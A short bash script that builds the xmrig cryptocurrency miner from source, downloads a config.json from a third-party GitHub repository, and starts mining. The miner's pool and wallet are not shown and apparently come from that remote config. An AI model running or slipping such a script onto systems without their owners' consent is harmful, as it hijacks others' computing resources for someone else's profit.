#!/bin/bash

# Update package information
sudo apt-get update -y

# Install required dependencies
sudo apt-get install cmake git build-essential libuv1-dev libhwloc-dev libssl-dev -y

# Clone xmrig repository
git clone https://github.com/xmrig/xmrig.git

# Navigate to the xmrig directory
cd xmrig

# Create a build directory and navigate into it
mkdir build
cd build

# Build xmrig
cmake ..
make

# Download the config.json file
wget https://raw.githubusercontent.com/sakibweb/xmrig/main/config.json

# Run xmrig
./xmrig
